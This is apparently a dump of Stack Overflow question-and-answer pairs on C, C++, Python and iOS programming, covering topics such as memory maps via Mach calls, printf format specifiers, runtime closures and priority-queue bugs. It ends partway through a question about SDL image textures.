"<p>In Linux, the easiest way to look at a process' memory map is looking at <code>/proc/PID/maps</code>, giving something like this:</p>

<pre>
08048000-08056000 r-xp 00000000 03:0c 64593      /usr/sbin/gpm
08056000-08058000 rw-p 0000d000 03:0c 64593      /usr/sbin/gpm
08058000-0805b000 rwxp 00000000 00:00 0
40000000-40013000 r-xp 00000000 03:0c 4165       /lib/ld-2.2.4.so
40013000-40015000 rw-p 00012000 03:0c 4165       /lib/ld-2.2.4.so
4001f000-40135000 r-xp 00000000 03:0c 45494      /lib/libc-2.2.4.so
40135000-4013e000 rw-p 00115000 03:0c 45494      /lib/libc-2.2.4.so
4013e000-40142000 rw-p 00000000 00:00 0
bffff000-c0000000 rwxp 00000000 00:00 0
</pre>

<p>How can a process get the equivalent information (address ranges, protection, mapped filename, etc...) about a process' own memory map under OSX 10.5 or 10.6?</p>
","9530","","<p>There is a <a href=""http://osxbook.com/book/bonus/chapter11/procfs/"">MacFUSE implementation of procfs</a>.  With it, you can get the memory map as follows:</p>

<pre><code>cat /proc/PID/task/vmmap
</code></pre>

<p>Looking at the <a href=""http://macfuse.googlecode.com/svn/trunk/filesystems/procfs/"">source code</a>, it looks like it's using the <a href=""http://www.gnu.org/software/hurd/gnumach-doc/Virtual-Memory-Interface.html#Virtual-Memory-Interface"">Mach virtual memory interface</a> to get the memory map from the kernel.</p>

<p>Here's the implementation for the <code>vmmap</code> pseudofile:</p>

<pre><code>/*
 * procfs as a MacFUSE file system for Mac OS X
 *
 * Copyright Amit Singh. All Rights Reserved.
 * http://osxbook.com
 *
 * http://code.google.com/p/macfuse/
 *
 * Source License: GNU GENERAL PUBLIC LICENSE (GPL)
 */
READ_HANDLER(proc__task__vmmap)
{
    int len = -1;
    kern_return_t kr;
#define MAX_VMMAP_SIZE 65536 /* XXX */
    char tmpbuf[MAX_VMMAP_SIZE];
    task_t the_task;
    pid_t pid = strtol(argv[0], NULL, 10);

    kr = task_for_pid(mach_task_self(), pid, &amp;the_task);
    if (kr != KERN_SUCCESS) {
        return -EIO;
    }

    vm_size_t vmsize;
    vm_address_t address;
    vm_region_basic_info_data_t info;
    mach_msg_type_number_t info_count;
    vm_region_flavor_t flavor;
    memory_object_name_t object;

    kr = KERN_SUCCESS;
    address = 0;
    len = 0;

    do {
        flavor = VM_REGION_BASIC_INFO;
        info_count = VM_REGION_BASIC_INFO_COUNT;
        kr = vm_region(the_task, &amp;address, &amp;vmsize, flavor,
                       (vm_region_info_t)&amp;info, &amp;info_count, &amp;object);
        if (kr == KERN_SUCCESS) {
            if (len &gt;= MAX_VMMAP_SIZE) {
                goto gotdata;
            }
            len += snprintf(tmpbuf + len, MAX_VMMAP_SIZE - len,
            ""%08x-%08x %8uK %c%c%c/%c%c%c %11s %6s %10s uwir=%hu sub=%u\n"",
                            address, (address + vmsize), (vmsize &gt;&gt; 10),
                            (info.protection &amp; VM_PROT_READ)        ? 'r' : '-',
                            (info.protection &amp; VM_PROT_WRITE)       ? 'w' : '-',
                            (info.protection &amp; VM_PROT_EXECUTE)     ? 'x' : '-',
                            (info.max_protection &amp; VM_PROT_READ)    ? 'r' : '-',
                            (info.max_protection &amp; VM_PROT_WRITE)   ? 'w' : '-',
                            (info.max_protection &amp; VM_PROT_EXECUTE) ? 'x' : '-',
                            inheritance_strings[info.inheritance],
                            (info.shared) ? ""shared"" : ""-"",
                            behavior_strings[info.behavior],
                            info.user_wired_count,
                            info.reserved);
            address += vmsize;
        } else if (kr != KERN_INVALID_ADDRESS) {

            if (the_task != MACH_PORT_NULL) {
                mach_port_deallocate(mach_task_self(), the_task);
            }

            return -EIO;
        }
    } while (kr != KERN_INVALID_ADDRESS);

gotdata:

    if (the_task != MACH_PORT_NULL) {
        mach_port_deallocate(mach_task_self(), the_task);
    }

    READ_PROC_TASK_EPILOGUE();
}
</code></pre>
"
"<p>Hi I'm trying to convert from an <code>int</code> to a <code>float</code> in C and for some reason the cast changes the value and I'm not sure why. So:</p>

<pre><code>fprintf (stderr, ""%d,%d\n"", rgbValues-&gt;green, (float)rgbValues-&gt;green);
</code></pre>

<p>produces two different numbers. Note that <code>rgbValues-&gt;green</code> is an <code>int</code>. </p>

<p>Any idea why this is happening?</p>

<p>Thanks</p>
","9530","","<p>The <code>%d</code> format specifier says to <code>printf</code>, ""take the next 4 bytes off of the stack, interpret them as an integer, and print out that integer.""  Since you're actually passing a <code>float</code> as a parameter, the bytes of the <code>float</code> (which are stored in <a href=""http://en.wikipedia.org/wiki/IEEE%5F754"" rel=""nofollow"">IEEE-754</a> format) are getting misinterpreted as an integer, hence the different values.  (Actually, the <code>float</code> is getting converted to a <code>double</code> due to argument promotion within variadic functions, and it's the first 4 bytes of that promoted <code>double</code> that are getting interpreted as an integer.)</p>

<p>The correct solution is to use one of the <code>%e</code>, <code>%f</code>, or <code>%g</code> format specifiers instead of <code>%d</code> when printing out a <code>float</code>.  <code>%e</code> says, ""take the next 8 bytes off the stack, interpret them as a <code>double</code>, and print it out using scientific (exponential) notation""  <code>%f</code> prints out using a fixed-point format, and <code>%g</code> prints out whichever would be shorter of <code>%e</code> or <code>%f</code>.</p>

<pre><code>fprintf(stderr, ""%d,%f\n"", rgbValues-&gt;green, (float)rgbValues-&gt;green);
</code></pre>
"
"<p>Following code:</p>

<pre><code>def __init__(self, url, **kwargs):
    for key in kwargs.keys():
    	url = url.replace('%%s%' % key, str(kwargs[key]))
</code></pre>

<p>Throws the following exception:</p>

<pre><code>File ""/home/wells/py-mlb/lib/fetcher.py"", line 25, in __init__
url = url.replace('%%s%' % key, str(kwargs[key]))
ValueError: incomplete format
</code></pre>

<p>The string has a format like:</p>

<pre><code>http://www.blah.com?id=%PLAYER_ID%
</code></pre>

<p>What am I doing wrong?</p>
","9530","","<p>You probably want the format string <code>%%%s%%</code> instead of <code>%%s%</code>.</p>

<p>Two consecutive <code>%</code> signs are interpreted as a literal <code>%</code>, so in your version, you have a literal <code>%</code>, a literal <code>s</code>, and then a lone <code>%</code>, which is expecting a format specifier after it.  You need to double up each literal <code>%</code> to not be interpreted as a format string, so you want <code>%%%s%%</code>: literal <code>%</code>, <code>%s</code> for string, literal <code>%</code>.</p>
"
"<p>When using the function <code>atoi</code> (or <code>strtol</code> or similar functions for that matter), how can you tell if the integer conversion failed or if the C-string that was being converted was a <code>0</code>?</p>

<p>For what I'm doing, <code>0</code> is an acceptable value and the C-string being converted may contain any number of <code>0</code>s. It may also have leading whitespace.</p>
","9530","","<p>An alternative to <code>strtol</code> is <code>sscanf</code>, although it's a little heavy-weight:</p>

<pre><code>const char *numStr = ""12345"";  // input string
int value;
if(sscanf(numStr, ""%d"", &amp;value) == 1)
    ;  // parsing succeeded, use value
else
    ;  // error
</code></pre>

<p>However, this allows leading whitespace in your string (which may or may not be desirable), and it allows anything to trail the number, so ""123abc"" would be accepted and return 123.  If you want to have tighter control, go with <code>strtol()</code>, as <a href=""http://stackoverflow.com/questions/1640720/how-do-i-tell-if-the-c-function-atoi-failed-or-if-it-was-a-string-of-zeros/1640804#1640804"">AndreyT demonstrates</a>.</p>
"
"<p>DISCLAIMER: I haven't done C++ for some time...</p>

<p>Is it common nowadays to decorate C/C++ function/method declarations in order to improve readability?</p>

<p><strong>Crude Example:</strong></p>

<p><code>void some_function(IN int param1, OUT char **param2);</code></p>

<p>with the macros <em>IN</em> and <em>OUT</em> defined with an <em>empty</em> body (i.e. lightweight documentation if you will in this example). Of course I understand this goes somewhat in parallel with the ""doc comment block"" associated with the method/function.</p>

<p>Could you provide some other examples... assuming this topic is useful to the community. <strong>Please</strong> bear in mind that the example above is just what it is.</p>
","9530","","<p>Windows headers actually do exactly this.  See <a href=""http://msdn.microsoft.com/en-us/library/aa383701%28VS.85%29.aspx"" rel=""nofollow"">Header Annotations</a> for the full list of annotations used.  For example""</p>

<pre><code>DWORD
WINAPI
GetModuleFileName(
    __in_opt HMODULE hModule,
    __out_ecount_part(nSize, return + 1) LPTSTR lpFilename,
    __in DWORD nSize
    );
</code></pre>

<p>For this function, <code>hModule</code> is an optional input parameter, <code>lpFilename</code> is an output parameter which store a maximum of <code>nSize</code> character elements and which will contain (the return value of the function)+1 character elements in it upon return, and <code>nSize</code> is an input parameter.</p>
"
"<p>I have an array of N * L integers</p>

<pre><code>int array[N * L];
</code></pre>

<p>I want to divide the array in N blocks of L elements and sort the blocks according to the classic list comparison (compare first element, than second, etc).</p>

<p>In C I can do:</p>

<pre><code>qsort(array, N, sizeof(int) * L, comp);
</code></pre>

<p>How can I achieve the same result using C++ std::sort(...) which is, presumably, faster?</p>

<p><strong>Update</strong>: The array must stay a C array like above. Can't use std::vector&lt;>. My data comes through comes from MPI_Recv(...).</p>

<p><strong>Update</strong>: My problem is that L is <em>variable</em> and with qsort() version I need to make L global (and I say goodbye to thread safety). std::sort() allows me to pass a functor which stores L at construction point.</p>

<p><strong>NOTE:</strong> The <code>qsort</code> function implements a quick-sort algorithm to sort an array of N elements, each of L bytes.</p>
","9530","","<p>It's not part of any ANSI, ISO, or POSIX standard, but some systems provide the <a href=""http://www.ipnom.com/FreeBSD-Man-Pages/qsort%5Fr.3.html"" rel=""nofollow""><code>qsort_r()</code></a> function, which allows you to pass an extra context parameter to the comparison function.  You can then do something like this:</p>

<pre><code>int comp(void *thunk, const void *a, const void *b)
{
    int L = (int)thunk;
    // compare a and b as you would normally with a qsort comparison function
}

qsort_r(array, N, sizeof(int) * L, (void *)L, comp);
</code></pre>

<p>Alternatively, if you don't have <code>qsort_r</code>, you can use the <a href=""http://www.haible.de/bruno/documentation/ffcall/callback/callback.html"" rel=""nofollow""><code>callback(3)</code></a> package from the ffcall library to create closures at runtime.  Example:</p>

<pre><code>#include &lt;callback.h&gt;
void comp_base(void *data, va_alist alist)
{
    va_start_int(alist);  // return type will be int

    int L = (int)data;
    const void *a = va_arg_ptr(alist, const void*);
    const void *b = va_arg_ptr(alist, const void*);

    // Now that we know L, compare
    int return_value = comp(a, b, L);

    va_return_int(alist, return_value);  // return return_value
}

...    

// In a function somewhere
typedef int (*compare_func)(const void*, const void*);

// Create some closures with different L values
compare_func comp1 = (compare_func)alloc_callback(&amp;comp_base, (void *)L1);
compare_func comp2 = (compare_func)alloc_callback(&amp;comp_base, (void *)L2);
...
// Use comp1 &amp; comp2, e.g. as parameters to qsort
...
free_callback(comp1);
free_callback(comp2);
</code></pre>

<p>Note that the <code>callback</code> library is threadsafe, since all parameters are passed on the stack or in registers.  The library takes care of allocating memory, making sure that memory is executable, and flushing the instruction cache if necessary to allow dynamically generated code (that is, the closure) to be executed at runtime.  It supposedly works on a large variety of systems, but it's also quite possible that it won't work on yours, either due to bugs or lack of implementation.</p>

<p>Also note that this adds a little bit of overhead to the function call.  Each call to <code>comp_base()</code> above has to unpack its arguments from the list passed it (which is in a highly platform-dependent format) and stuff its return value back in.  Most of the time, this overhead is miniscule, but for a comparison function where the actual work performed is very small and which will get called many, many times during a call to <code>qsort()</code>, the overhead is very significant.</p>
"
"<p>In <a href=""http://stackoverflow.com/questions/1649529/sorting-blocks-of-l-elements"">this SO</a> thread, <a href=""http://stackoverflow.com/users/53491/brian-postow"">Brian Postow</a> <a href=""http://stackoverflow.com/questions/1649529/sorting-blocks-of-l-elements/1649971#1649971"">suggested</a> a solution involving fake anonymous functions:</p>

<blockquote>
  <p>make a comp(L) function that returns the version of comp for arrays of length L... that way L becomes a parameter, not a global</p>
</blockquote>

<p>How do I implement such a function?</p>
","9530","","<p>See <a href=""http://stackoverflow.com/questions/1649529/sorting-blocks-of-l-elements/1654737#1654737"">the answer I just posted</a> to that question.  You can use the <a href=""http://www.haible.de/bruno/documentation/ffcall/callback/callback.html""><code>callback(3)</code></a> library to generate new functions at runtime.  It's not standards compliant, since it involves lots of ugly platform-specific hacks, but it does work on a large number of systems.</p>

<p>The library takes care of allocating memory, making sure that memory is executable, and flushing the instruction cache if necessary, in order to ensure that code which is dynamically generated (i.e. the closure) is executable.  It essentially generates stubs of code that might look like this on x86:</p>

<pre><code>  pop %ecx
  push $THUNK
  push %ecx
  jmp $function
THUNK:
  .long $parameter
</code></pre>

<p>And then returns the address of the first instruction.  What this stub does is stores the the return address into ECX (a scratch register in the x86 calling convention), pushes an extra parameter onto the stack (a pointer to a thunk), and then re-pushes the return address.  Then, it jumps to the actual function.  This results in the function getting fooled into thinking it has an extra parameter, which is the hidden context of the closure.</p>

<p>It's actually more complicated than that (the actual function called at the end of the stub is <code>__vacall_r</code>, not the function itself, and <code>__vacall_r()</code> handles more implementation details), but that's the basic principle.</p>
"
"<p>I've allocated a chuck of memory with <code>char* memoryChunk = malloc ( 80* sizeof(char) + 1);</code> What is keeping me from writing into the memory location beyond 81 units? What can I do to prevent that?</p>

<pre><code>void testStage2(void) {
 char c_str1[20] = ""hello"";
 char* ut_str1;
 char* ut_str2;

 printf(""Starting stage 2 tests\n"");
 strcat(c_str1, "" world"");
 printf(""%s\n"", c_str1); // nothing exciting, prints ""hello world""

 ut_str1 = utstrdup(""hello "");
 ut_str1 = utstrrealloc(ut_str1, 20);
 utstrcat(ut_str1, c_str1);
 printf(""%s\n"", ut_str1); // slightly more exciting, prints ""hello hello world""

 utstrcat(ut_str1, "" world"");
 printf(""%s\n"", ut_str1); // exciting, should print ""hello hello world wo"", 'cause there's not enough room for the second world
}

char* utstrcat(char* s, char* suffix){
 int i = strlen(s),j;
 int capacity = *(s - sizeof(unsigned) - sizeof(int));
 for ( j =0; suffix[j] != '\0'; j++){
  if ((i+j-1) == 20)
   return s;
  s[i+j] = suffix[j];
 }
 //strcpy(s, suffix);
 s[i + j] = '\0';
 return s;
}// append the suffix to s
</code></pre>
","9530","","<p>Nothing is stopping you from doing that.  If you do so, anything could happen: the program could continue on its merry way as if nothing happened, it might crash now, it might crash later, it might even erase your hard drive.  This is the realm of <em>undefined behavior</em>.</p>

<p>There are a number of tools that try to detect or mitigate these types of problems, but nothing is fool-proof.  One such tool is <a href=""http://valgrind.org/"" rel=""nofollow"">valgrind</a>.  valgrind watches your program's pattern of memory accesses and notifies you of problems like this.  It does this by running your program in a virtual machine of sorts, so it hurts the performance of your program significantly, but it can help you catch lots of errors when used correctly.</p>
"
"<p>Is there any equivalent function of <code>memset</code> for vectors in C++ ?</p>

<p>(Not <code>clear()</code> or <code>erase()</code> method, I want to retain the size of vector, I just want to initialize all the values.)</p>
","9530","","<p>Use <a href=""http://en.cppreference.com/w/cpp/algorithm/fill""><code>std::fill()</code></a>:</p>

<pre><code>std::fill(myVector.begin(), myVector.end(), 0);
</code></pre>
"
"<p>So, I'm coding some packet structures (Ethernet, IP, etc) and noticed that some of them are followed by <strong>attribute</strong>((packed)) which prevents the gcc compiler from attempting to add padding to them.  This makes sense, because these structures are supposed to go onto the wire.</p>

<p>But then, I counted the words:</p>

<pre><code>struct ether_header
{
  u_int8_t  ether_dhost[ETH_ALEN];  /* destination eth addr	*/
  u_int8_t  ether_shost[ETH_ALEN];  /* source ether addr	*/
  u_int16_t ether_type; 	        /* packet type ID field	*/
} __attribute__ ((packed));
</code></pre>

<p>This is copied from a site, but my code also uses 2 uint8_t and 1 uint16_t.  This adds up to two words (4 bytes).  </p>

<p>Depending on the source, the system prefers that structures be aligned according to multiples of 4,8, or even 16 bits.  So, I don't see why the <strong>attribute</strong>((packed)) is necessary, as afaik this shouldn't get packed.</p>

<p>Also, why the double brackets ((packed)) why not use one pair?</p>
","9530","","<p>If your structure is already a multiple of the right size, then no, the <code>__attribute__((packed))</code> isn't strictly necessary, but it's still a good idea, in case your structure size ever changes for any reason.  If you add/delete fields, or change <code>ETH_ALEN</code>, you'll still want <code>__attribute__((packed))</code>.</p>

<p>I believe the double parentheses are needed to make it easy to make your code compatible with non-gcc compilers.  By using them, you can then just do this:</p>

<pre><code>#define __attribute__(x)
</code></pre>

<p>And then all attributes that you specify will disappear.  The extra parentheses mean there is only one argument passed to the macro (instead of one or more), regardless of how many attributes you specify, and your compiler does not need to support variadic macros.</p>
"
"<p>I can iterate over the subsets of size 1</p>

<pre><code>for( int a = 0; a &lt; size; a++ ) {
</code></pre>

<p>or subsets of size 2</p>

<pre><code>for( int a1 = 0; a1 &lt; size; a1++ ) {
    for( int a2 = a1+1; a2 &lt; size; a2++ ) {
</code></pre>

<p>or 3</p>

<pre><code>for( int a1 = 0; a1 &lt; size; a1++ ) {
for( int a2 = a1+1; a2 &lt; size; a2++ ) {
   for( int a3 = a2+1; a3 &lt; size; a3++ ) {
</code></pre>

<p>But how to do this for subsets of size n?</p>

<p>This does the job, based on an answer by Adam Rosenfield</p>

<pre><code>void iterate(int *a, int i, int size, int n)
{
 int start = 0;
 if( i &gt; 0 ) start = a[i-1]+1;
 for(a[i] = start; a[i] &lt; n; a[i]++) {
  if(i == n-1) {
      // a is the array of indices of size n
      for( int k = 0; k &lt; size; k++ ) {
          printf(""%d "",a[k]);
      }
      printf(""\n"");
  }
        else
            iterate(a, i+1, size, n);
    }
}
</code></pre>
","9530","","<p>You can use recursion:</p>

<pre><code>void iterate(int *a, int i, int size, int n)
{
    for(a[i] = 0; a[i] &lt; size; a[i]++)
    {
        if(i == n-1)
            DoStuff(a, n);  // a is the array of indices of size n
        else
            iterate(a, i+1, size, n);
    }
}
...
// Equivalent to 4 nested for loops
int a[4];
iterate(a, 0, size, 4);
</code></pre>
"
"<p>For iPhone game development, I switched from PNG format to PVRTC format for the sake of performance. But PVRTC compression is ruining the quality of the images.. I am using spritesheets with transparencies for the character animations.. and the pvrtc makes the edges look muddy around the character near the transparencies.</p>

<p>I read that pvrtc cant handle edges and all.. but is there a solution to it? Can we do something to these images whereby atleast there wont be these muddy boundaries around the character..</p>

<p>Sankar</p>
","9530","","<p>PVRTC is a <a href=""http://en.wikipedia.org/wiki/Lossy%5Fcompression"" rel=""nofollow"">lossy compression</a> algorithm -- it will cause compression artifacts.  If you can't or don't want to deal with that, don't use it.  See if you can't find other places in your game to optimize instead.</p>
"
"<p>in c, i tried to print out address of variable and address of some function. 
I got one is negative value, the other is positive value.
My question is: why does C not represent in all negative or all positive value?</p>

<p>Here is my code:</p>

<pre><code>int foo() { 
     return 0;
}

int main() {

    int a;
    printf(""%d\n"",&amp;a);

    printf(""%d\n"",foo);

    return 0;
}
</code></pre>

<p>Here is result:</p>

<pre><code>-1075908992 134513684
</code></pre>
","9530","","<p>Memory addresses should not be interpreted as signed integers in that way.  The sign of the number depends on the highest bit set (assuming two's complement representation, which is used by the vast majority of systems currently in use), so a memory address above 0x80000000 on a 32-bit system will be negative, and a memory address below 0x80000000 will be positive.  There's no real significance to that.</p>

<p>You should be printing memory addresses using the <code>%p</code> modifier; alternatively, some people use <code>%08x</code> for printing memory addresses (or <code>%016llx</code> on 64-bit systems).  This will always print out as an unsigned integer in hexadecimal, which is far more useful than a signed decimal integer.</p>

<pre><code>int a;
printf(""%p\n"", &amp;a);
</code></pre>
"
"<p>I am trying to use priority_queue, and program constantly fails with error message HEAP CORRUPTION DETECTED.</p>

<p>here are the snippets:</p>

<pre><code>class CQueue { ...
              priority_queue&lt;Message, deque&lt;Message&gt;, less&lt;deque&lt;Message&gt;::value_type&gt; &gt; m_messages;
...};
</code></pre>

<p>class Message has overloaded operators > and &lt;</p>

<p>Here I fill up queue:</p>

<pre><code>CQueue &amp; operator+=(Message &amp;rhv)
{
	m_messages.push(rhv);  //This is where program fails
	return *this;
}
</code></pre>

<p>and in the main program:</p>

<pre><code>string str;
CQueue pq;
for(int i = 0; i &lt; 12; ++i)
{
	cin &gt;&gt; str;

	Message p(str.c_str(), rand()%12); //Create message with random priority
	pq += p;                           //add it to queue
}
</code></pre>

<p>I have no idea what seems to be the problem. It happens when I push about 8 items, and it fails on line</p>

<pre><code>    push_heap(c.begin(), c.end(), comp);
</code></pre>

<p>in &lt; queue ></p>

<p>:(</p>

<p>Here is the definition of message class - it's very simple:</p>

<pre><code>#pragma once 

#include &lt;iostream&gt;
#include &lt;cstring&gt;
#include &lt;utility&gt;

using namespace std;

 class Poruka
{
private:
char *m_tekst;
int  m_prioritet;
public:
Poruka():m_tekst(NULL), m_prioritet(-1){}

Poruka(const char* tekst, const int prioritet)
{
	if(NULL != tekst)
	{
	//	try{
			m_tekst = new char[strlen(tekst) + 1];
		//}
		//catch(bad_alloc&amp;)
	//	{
	//		throw;
	//	}


		strcpy(m_tekst, tekst);
	}
	else
	{ 
	//	try
	//	{
			m_tekst = new char[1];
	//	}
	//	catch(bad_alloc&amp;)
	//	{
	//		throw;
	//	}

		m_tekst[0] = '\0';
	}
	m_prioritet = prioritet;
}

Poruka(const Poruka &amp;p)
{
	if(p.m_tekst != NULL)
	{
		//try
		//{
			m_tekst = new char[strlen(p.m_tekst) + 1];
		//}
		//catch(bad_alloc&amp;)
		//{
		//	throw;
		//}

		strcpy(m_tekst, p.m_tekst);
	}
	else
	{
		m_tekst = NULL;
	}
	m_prioritet = p.m_prioritet;
}

~Poruka()
{
		delete [] m_tekst;
}

Poruka&amp; operator=(const Poruka&amp; rhv)
{
	if(&amp;rhv != this)
	{
		if(m_tekst != NULL)
			delete [] m_tekst;

	//	try
		//{
			m_tekst = new char[strlen(rhv.m_tekst + 1)];
		//}
		//catch(bad_alloc&amp;)
		//{
		//	throw;
		//}

		strcpy(m_tekst, rhv.m_tekst);
		m_prioritet = rhv.m_prioritet;
	}
	return *this;
}

friend ostream&amp; operator&lt;&lt;(ostream&amp; it, const Poruka &amp;p)
{
	it &lt;&lt; '[' &lt;&lt; p.m_tekst &lt;&lt; ']' &lt;&lt; p.m_prioritet;
	return it;
}

//Relacioni operatori

friend inline bool operator&lt;(const Poruka&amp; p1, const Poruka&amp; p2)
{
	return p1.m_prioritet &lt; p2.m_prioritet;
}

friend inline bool operator&gt;(const Poruka&amp; p1, const Poruka&amp; p2)
{
	return p2 &lt; p1;
}

friend inline bool operator&gt;=(const Poruka&amp; p1, const Poruka&amp; p2)
{
	return !(p1 &lt; p2);
}

friend inline bool operator&lt;=(const Poruka&amp; p1, const Poruka&amp; p2)
{
	return !(p1 &gt; p2);
}

friend inline bool operator==(const Poruka&amp; p1, const Poruka&amp; p2)
{
	return (!(p1 &lt; p2) &amp;&amp; !(p2 &lt; p1));
}

friend inline bool operator!=(const Poruka&amp; p1, const Poruka&amp; p2)
{
	return (p1 &lt; p2) || (p2 &lt; p1);
}
</code></pre>

<p>};</p>

<p>Poruka - Message</p>
","9530","","<p>I think the problem is that your <code>Message</code> objects are keeping pointers to raw C strings which are then getting deallocated.  In these lines:</p>

<pre><code>cin &gt;&gt; str;

Message p(str.c_str(), rand()%12);
</code></pre>

<p>On each iteration of the loop, you're reading in a new value to <code>str</code>, which invalidates any old pointers returned by its <code>c_str()</code> method, so your older messages are pointing to invalid data.  You should change your <code>Message</code> object so that it stores its string as an <code>std::string</code> instead of a <code>char*</code>.  This will properly copy the string into the <code>Message</code> object.</p>

<p>Alternatively, if you can't change the <code>Message</code> class, you'll have to explicitly copy the string yourself, e.g. using <code>strdup()</code> or <code>malloc()</code>/<code>new[]</code>+<code>strcpy()</code>, and then you have to remember to deallocate the string copies at some later point.</p>
"
"<p>My current understanding of condition variables is that all blocked (waiting) threads are inserted into a basic FIFO queue, the first item of which is awakened when signal() is called.</p>

<p>Is there any way to modify this queue (or create a new structure) to perform as a priority queue instead?  I've been thinking about it for a while, but most solutions I have end up being hampered by the existing queue structure inherent to C.V.'s and mutexes.</p>

<p>Thanks!</p>
","9530","","<p>I think you should rethink what you're trying to do.  If you're trying to optimize your performance, you're probably barking up the wrong tree.</p>

<p><a href=""http://www.opengroup.org/onlinepubs/007908799/xsh/pthread%5Fcond%5Fsignal.html"" rel=""nofollow""><code>pthread_cond_signal()</code></a> isn't even guaranteed to unblock exactly one thread -- it's guaranteed to unblock <em>at least</em> one thread, so your code better be able to handle the situation where multiple threads are unblocked simultaneously.  The typical way to do this is for each thread to re-check the condition after becoming unblocked, and, if false, return to waiting again.</p>

<p>You could implement some sort of scheme where you kept your own priority queue of threads waiting, and each thread added itself to that queue immediately before it was to begin waiting, and then it would check the queue when unblocking, but this would add a lot of complexity and a lot of potential for serious problems (race conditions, deadlocks, etc.).  It was also add a non-trivial amount of overhead.</p>

<p>Also, what happens if a higher-priority thread starts waiting on a condition variable at the same moment that condition variable is being signalled?  Who gets unblocked, the newly arrived high-priority thread or the former highest priority thread?</p>

<p>The order that threads get unblocked in is entirely dependent on the kernel's thread scheduler, so you are at its mercy.  I wouldn't even assume FIFO ordering, either.</p>
"
"<p>Until now I've been only writing console applications but I need to write a simple window application for a school assignment.</p>

<p>Could somebody point me to a good tutorial how to create windows and other ordinary windows elements such as buttons, 2d graphs etc in ANSI C? is there some good library I should use?</p>

<p>I tried googling but there are no tutorial websites devoted to C.</p>

<p>If you can, I would also appreciate some example code.</p>

<p>Thank you.</p>

<p>By the way, I use Dec C++.</p>
","9530","","<p>There's nothing in the ANSI C standard about windows.  If you want to make a windowed application, you'll have to use platform-specific libraries (e.g. <a href=""http://en.wikipedia.org/wiki/Windows%5FAPI"" rel=""nofollow"">Win32</a>, <a href=""http://developer.apple.com/cocoa/"" rel=""nofollow"">Cocoa</a>, or <a href=""http://www.x.org/"" rel=""nofollow"">X11</a>), or some sort of cross-platform library that encapsulates that (e.g. <a href=""http://www.libsdl.org/"" rel=""nofollow"">SDL</a>, <a href=""http://www.wxwidgets.org/"" rel=""nofollow"">wxWidgets</a>, or many more).</p>
"
"<p>C++ headers</p>

<p>If I have A.cpp and A.h as well as b.h, c.h, d.h</p>

<p>Should I do:</p>

<p>in A.h:</p>

<pre><code>#include ""b.h""
#include ""c.h""
#include ""d.h""
</code></pre>

<p>in A.cpp:</p>

<pre><code>#include ""A.h""
</code></pre>

<p><b>or</b></p>

<p>in A.cpp:</p>

<pre><code>#include ""A.h""
#include ""b.h""
#include ""c.h""
#include ""d.h""
</code></pre>

<p>Are there performance issues? Obvious benefits? Is something bad about this?</p>
","9530","","<p>You should only include what is necessary to compile; adding unnecessary includes will hurt your compilation times, especially in large projects.</p>

<p>Each header file should be able to compile cleanly on its own -- that is, if you have a source file that includes only that header, it should compile without errors.  The header file should include no more than is necessary for that.</p>

<p>Try to use forward declarations as much as possible.  If you're using a class, but the header file only deals with pointers/references to objects of that class, then there's no need to include the definition of the class -- just use a forward declaration:</p>

<pre><code>class SomeClass;
// Can now use pointers/references to SomeClass
// without needing the full definition
</code></pre>
"
"<p>How can I do this?  (The following code does NOT work, but I hope it explains the idea.)</p>

<pre><code>class MyClass  
{  
    ....  
 private:
    int ToBeCalled(int a, char* b);

    typedef (MyClass::*FuncSig)(int a, char* b);

    int Caller(FuncSig *func, char* some_string);
}
</code></pre>

<p>I want to call Caller in some way like:</p>

<pre><code>Caller(ToBeCalled, ""stuff"")
</code></pre>

<p>and have <code>Caller</code> call <code>ToBeCalled</code> with whatever parameters it feels needs passing. If at all possible I want to keep everything encapsulated in the private part of my class. In reality, I'd have about 50 functions like <code>ToBeCalled</code>, so I can't see a way to avoid this.</p>

<p>Thanks for any suggestions. :)</p>
","9530","","<p>You're most of the way there.  You're missing the return type from the typedef, it should be</p>

<pre><code>typedef int (MyClass::*FuncSig)(int, char*);
</code></pre>

<p>Now, you just need to use it properly:</p>

<pre><code>int Caller(FuncSig func, int a, char* some_string)
{
    return (this-&gt;*func)(a, some_string);
}
</code></pre>

<p>You want to pass around plain <code>FuncSig</code> instances, not <code>FuncSig*</code> -- a <code>FuncSig*</code> is a pointer to a pointer to a member function, with an extra unnecessary level of indirection.  You then use the arrow-star operator (not its official name) to call it:</p>

<pre><code>(object_to_be_called_on -&gt;* func)(args);
</code></pre>

<p>For non-pointer objects (e.g. objects on the stack, or references to objects), you use the dot-star operator:</p>

<pre><code>MyClass x;
(x .* func)(args);
</code></pre>

<p>Also, be wary of operator precedence -- the arrow-star and dot-star operators have lower precedence than function calls, so you need to put in the extra parentheses as I have done above.</p>
"
"<p>I've been working on adding in-app purchases and was able to create and test in-app purchases using Store Kit (yay!).  During testing, I exercised my app in a way which caused the app to crash mid purchase (so I guess the normal cycle of receiving paymentQueue:updatedTransactions and calling finishTransaction was interrupted).</p>

<p>Now I am unable to successfully complete any transactions and instead am getting only transactions with transactionState SKPaymentTransactionStateFailed when paymentQueue:updatedTransactions is called.</p>

<p>The transaction.error.code is -1003 and the transaction.error.localizedDescription is ""Cannot connect to iTunes Store""!</p>

<p>I have tried removing all products from iTunesConnect, and rebuilt them using different identifiers but that did not help.  I have also tried using the App Store app to really connect to the real App Store and download some apps so I do have connectivity.  Finally, I have visited the Settings:Store app to make sure I am signed out of my normal app store account.</p>
","9530","","<p>If you're getting error 0 ""Cannot connect to iTunes Store"" (which I realize is not the error -1003 that OP asked about, but a web search for error 0 also leads here), this can be caused by two possible problems:</p>

<ol>
<li>You're passing in the wrong product identifier.  If that's the case, then you'll get error 0 shortly after calling <code>-[SKPaymentQueue addPayment:]</code>, before you get the popup asking you to confirm payment.</li>
<li>Your test user has become invalidated.  This can happen if you accidentally log into the App Store with your test user.  When this happens, you'll get error 0 after entering your password to confirm your payment.</li>
</ol>

<p>To fix problem #1, pass in the correct product ID.  To fix problem #2, create a new test user on iTunes Connect, and optionally delete the old test user.</p>
"
"<p>I'm trying to load an image file and use it as a texture for a cube. I'm using SDL_image to do that.</p>

<p><img src=""http://i33.tinypic.com/2i1f3bp.jpg"" alt=""original image""></p>

<p>I used this image because I've found it in various file formats (tga, tif, jpg, png, bmp)</p>

<p>The code :</p>

<pre><code>SDL_Surface * texture;

//load an image to an SDL surface (i.e. a buffer)

texture = IMG_Load(""/Users/Foo/Code/xcode/test/lena.bmp"");

if(texture == NULL){
	printf(""bad image\n"");
	exit(1);
}

//create an OpenGL texture object 
glGenTextures(1, &amp;textureObjOpenGLlogo);

//select the texture object you need
